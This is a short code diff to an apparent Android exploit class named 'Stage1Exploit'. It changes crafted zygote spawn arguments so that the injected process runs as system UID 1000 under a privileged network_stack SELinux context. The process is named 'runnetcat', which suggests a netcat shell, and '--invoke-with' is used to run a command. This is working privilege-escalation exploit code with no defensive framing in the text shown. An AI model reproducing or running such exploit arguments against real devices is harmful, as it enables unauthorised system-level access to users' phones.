@@ -187,12 +187,13 @@ class Stage1Exploit:
         assert "," not in command
         # TODO let you specify the SELinux context through command line arguments
         raw_zygote_arguments = [
-            "--setuid=10011",
-            "--setgid=10011",
-            "--setgroups=2001,1065,1023,3003,3007,1024",
+            "--setuid=1000",
+            "--setgid=1000",
+            "--setgroups=3003",
             "--runtime-args",
-            "--seinfo=media",
-            "--nice-name=android.media",
+            "--target-sdk-version=28",
+            "--seinfo=network_stack:privapp:targetSdkVersion=28:complete",
+            "--nice-name=runnetcat",
             "--mount-external-default",
             "--runtime-flags=1",
             "--invoke-with",
